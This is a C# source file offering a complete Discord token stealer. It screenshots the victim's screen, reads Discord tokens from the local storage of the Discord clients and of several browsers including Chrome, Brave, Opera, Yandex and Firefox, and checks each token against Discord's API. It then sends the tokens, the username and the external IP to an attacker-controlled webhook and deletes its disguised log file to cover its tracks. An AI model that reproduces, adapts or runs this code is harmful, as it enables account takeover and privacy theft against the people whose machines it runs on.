
/*
  Class made by Misakiii
  https://github.com/Miisaakii
  Don't use it for annoying people
*/


#region "Library"

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

#endregion

namespace DC
{
    #region "Stealer Class"

    public class Stealer
    {
		public static string Hook = "YOUR WEBHOOK URL";

		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";

		private static bool App = false;
		private static bool Canary = false;
		private static bool PTB = false;
		private static bool Chrome = false;
		private static bool Opera = false;
		private static bool Brave = false;
		private static bool Yandex = false;
		private static bool OperaGX = false;

		private static bool Firefox = false;
		private static bool StealFound;
		private static bool StealFirefoxFound;

		//used a another webhook more simple
		public static void SendWebHook(string token, string name, string picture, string message, string file)
		{
			Webhook hook = new Webhook(token);
			hook.Name = name;
			hook.ProfilePictureUrl = picture;

			hook.SendMessage(message, file);
		}

		private static List<string> TokenStealer(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Stealer.SaveTokens(Stealer.TokenCheckAcces(((Match)obj).Value));
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Stealer.SaveTokens(Stealer.TokenCheckAcces(((Match)obj2).Value));
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Stealer.StealFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Stealer.Firefox = false;
			Stealer.Opera = false;
			Stealer.Chrome = false;
			Stealer.App = false;
			Stealer.PTB = false;
			Stealer.Brave = false;
			Stealer.Yandex = false;
			Stealer.Canary = false;
			Stealer.OperaGX = false;
			return list;
		}

		private static string SaveTokens(string token)
		{
			if (!(token == ""))
			{
				string text;
				if (Stealer.Chrome)
				{
					text = "Chrome";
				}
				else if (Stealer.Opera)
				{
					text = "Opera";
				}
				else if (Stealer.App)
				{
					text = "Discord App";
				}
				else if (Stealer.Canary)
				{
					text = "Discord Canary";
				}
				else if (Stealer.PTB)
				{
					text = "Discord PTB";
				}
				else if (Stealer.Brave)
				{
					text = "Brave";
				}
				else if (Stealer.Yandex)
				{
					text = "Yandex";
				}
				else if (Stealer.OperaGX)
				{
					text = "Opera GX";
				}
				else
				{
					text = "Unknown";
				}
				text = text + " Token Found :: " + token + "\n";
				File.AppendAllText(Stealer._path, text);
				Stealer.RemoveDuplicatedLines(Stealer._path);
			}
			return token;
		}

		private static void RemoveDuplicatedLines(string path)
		{
			List<string> list = new List<string>();
			StringReader stringReader = new StringReader(File.ReadAllText(path));
			string item;
			while ((item = stringReader.ReadLine()) != null)
			{
				if (!list.Contains(item))
				{
					list.Add(item);
				}
			}
			stringReader.Close();
			StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.Open));
			foreach (string value in list)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Flush();
			streamWriter.Close();
		}

		private static string TokenCheckAcces(string token)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[""] = "";
				webClient.Headers.Add("Authorization", token);
				try
				{
					webClient.UploadValues("https://discordapp.com/api/v9/invite/kokoro", nameValueCollection);
				}
				catch (WebException ex)
				{
					string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
					if (text.Contains("401: Unauthorized"))
					{
						token = "";
					}
					else if (text.Contains("You need to verify your account in order to perform this action."))
					{
						token = "";
					}
				}
			}
			return token;
		}

		public static void StartSteal()
		{
			try
			{
				Bitmap bit = new Bitmap(1920, 1080);
				Graphics g = Graphics.FromImage(bit);
				g.CopyFromScreen(new Point(30, 30), new Point(0, 0), bit.Size);
				g.Dispose();
				bit.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg");

				string file = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg";

				SendWebHook(Hook, "Misaki Token Grab", "", "ScreenShot:", file);

				Stealer.StealTokenFromChrome();
				Stealer.StealTokenFromOpera();
				Stealer.StealTokenFromOperaGX();
				Stealer.StealTokenFromDiscordApp();
				Stealer.StealTokenFromDiscordCanary();
				Stealer.StealTokenFromDiscordPTB();
				Stealer.StealTokenFromBraveBrowser();
				Stealer.StealTokenFromYandexBrowser();
				Stealer.StealTokenFromFirefox();

				Stealer.Send(File.ReadAllText(Stealer._path));

				if (File.Exists(Stealer._path))
				{
					File.Delete(Stealer._path);
				}
			}
			catch (Exception)
			{

			}
		}

		private static void Send(string tokenReport)
		{
			try
			{
				string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");

				HttpClient httpClient = new HttpClient();
				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
				{
					{
						"content",
						string.Concat(new string[]
						{
							string.Join("\n", new string[]
							{
								"᲼᲼᲼᲼᲼᲼\n***New report from PC: " + Environment.UserName + " with IP: " + externalip + "*** ```asciidoc\n" + tokenReport + "\n```"
							}),
						})
					},
				};
				httpClient.PostAsync(Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			}
			catch
			{
			}
		}

		private static void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.App = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.App = true;
				}
			}
		}

		private static void StealTokenFromDiscordCanary()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Canary = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Canary = true;
				}
			}
		}

		private static void StealTokenFromDiscordPTB()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.PTB = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.PTB = true;
				}
			}
		}
		private static void StealTokenFromBraveBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Brave = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Brave = true;
				}
			}
		}

		private static void StealTokenFromYandexBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Yandex = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Yandex = true;
				}
			}
		}

		private static void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Chrome = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Chrome = true;
				}
			}
		}

		private static void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Opera = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Opera = true;
				}
			}
		}

		private static void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.OperaGX = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.OperaGX = true;
				}
			}
		}

		private static void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					List<string> list = Stealer.TokenStealerForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
					if (list != null && list.Count > 0)
					{
						foreach (string str in (from t in list
												where !Stealer.App
												select t).Select(new Func<string, string>(Stealer.TokenCheckAcces)))
						{
							Stealer.Firefox = true;
							File.AppendAllText(Stealer._path, "Firefox Token: " + str + Environment.NewLine);
						}
					}
				}
			}
		}

		private static List<string> TokenStealerForFirefox(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Stealer.StealFirefoxFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Stealer.Firefox = false;
			return list;
		}
	}

    #endregion

    #region "WebHook Class"

    class Webhook
	{
		private HttpClient Client;
		private string Url;

		public string Name { get; set; }
		public string ProfilePictureUrl { get; set; }

		public Webhook(string webhookUrl)
		{
			Client = new HttpClient();
			Url = webhookUrl;
		}

		public bool SendMessage(string content, string file = null)
		{
			MultipartFormDataContent data = new MultipartFormDataContent();
			data.Add(new StringContent(Name), "username");
			data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
			data.Add(new StringContent(content), "content");

			if (file != null)
			{
				if (!File.Exists(file))
					throw new FileNotFoundException();

				byte[] bytes = File.ReadAllBytes(file);

				data.Add(new ByteArrayContent(bytes), "file", "img.jpeg"); //change "file" to "file.(extention) if you wish to download as ext
			}

			var resp = Client.PostAsync(Url, data).Result;

			return resp.StatusCode == HttpStatusCode.NoContent;
		}
	}

    #endregion
}
